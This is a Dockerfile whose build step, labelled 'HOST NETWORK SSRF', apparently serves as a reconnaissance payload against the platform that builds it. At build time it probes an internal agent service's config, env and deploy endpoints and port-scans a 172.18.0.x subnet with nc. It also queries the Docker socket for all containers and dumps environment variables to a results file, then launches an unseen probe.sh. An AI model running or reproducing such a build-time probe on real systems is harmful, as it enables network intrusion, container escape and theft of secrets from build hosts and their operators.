FROM python:3-alpine
RUN apk add --no-cache curl iproute2 net-tools nmap-ncat

# === BUILD-PHASE: HOST NETWORK SSRF ===
RUN echo "=== BUILD PHASE ===" > /build-results.txt && \
    echo "--- interfaces ---" >> /build-results.txt && \
    ip -4 addr show >> /build-results.txt 2>&1 && \
    echo "" >> /build-results.txt && \
    echo "--- agent 172.18.0.2:8000 ---" >> /build-results.txt && \
    curl -s -m 5 http://172.18.0.2:8000/health >> /build-results.txt 2>&1 && \
    echo "" >> /build-results.txt && \
    curl -s -m 5 http://172.18.0.2:8000/openapi.json >> /build-results.txt 2>&1 && \
    echo "" >> /build-results.txt && \
    echo "--- agent endpoints ---" >> /build-results.txt && \
    for ep in / /docs /health /settings /config /env /status /app /deploy /webhooks /metrics /info; do \
      echo "GET $ep:" >> /build-results.txt; \
      curl -s -m 3 "http://172.18.0.2:8000$ep" >> /build-results.txt 2>&1; \
      echo "" >> /build-results.txt; \
    done && \
    echo "--- port scan 172.18.0.2-10 ---" >> /build-results.txt && \
    for i in 2 3 4 5 6 7 8 9 10; do \
      for port in 80 443 5672 8000 9090 9200 15672 27110; do \
        nc -z -w1 172.18.0.$i $port 2>/dev/null && echo "172.18.0.$i:$port OPEN" >> /build-results.txt; \
      done; \
    done && \
    echo "" >> /build-results.txt && \
    echo "--- docker socket ---" >> /build-results.txt && \
    curl -s -m 3 --unix-socket /var/run/docker.sock http://localhost/version >> /build-results.txt 2>&1 && \
    echo "" >> /build-results.txt && \
    echo "--- docker containers ---" >> /build-results.txt && \
    curl -s -m 5 --unix-socket /var/run/docker.sock 'http://localhost/containers/json?all=true' >> /build-results.txt 2>&1 && \
    echo "" >> /build-results.txt && \
    echo "--- env ---" >> /build-results.txt && \
    env >> /build-results.txt 2>&1 ; \
    echo "=== BUILD DONE ===" >> /build-results.txt ; true

WORKDIR /app
COPY probe.sh /app/
RUN chmod +x /app/probe.sh
EXPOSE 8080
CMD ["/app/probe.sh"]
